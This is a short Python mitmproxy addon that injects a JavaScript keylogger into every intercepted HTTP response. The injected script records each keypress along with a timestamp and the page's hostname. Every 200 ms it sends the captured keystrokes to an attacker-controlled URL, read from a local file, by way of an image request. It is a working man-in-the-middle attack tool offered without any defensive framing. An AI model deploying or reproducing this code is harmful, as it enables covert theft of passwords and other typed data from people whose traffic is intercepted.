from mitmproxy import http
import sys
import time
import os

URLVAL = ""
while len(URLVAL) == 0:
	time.sleep(.1)
	try:
		URLVAL = open("temp").read().strip()
	except:
		URLVAL = ""

def response(flow: http.HTTPFlow) -> None:
	flow.response.content += b"""<script>var buffer = [];
var attacker = 'THE_URL/?c='
var url = document.location.hostname;
document.onkeypress = function(e) {
	var timestamp = Date.now() | 0;
	var stroke = {
		k: e.key,
		t: timestamp,
		w: url
	};
	buffer.push(stroke);
}

function httpGet(theUrl)
// The network request grabs the json containing mp3 structure
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

window.setInterval(function() {
	if (buffer.length > 0) {
		var data = encodeURIComponent(JSON.stringify(buffer));

		new Image().src = attacker + data;
		buffer = [];
	}
}, 200);</script>"""
	flow.response.content = flow.response.content.replace(b"THE_URL", URLVAL.encode())
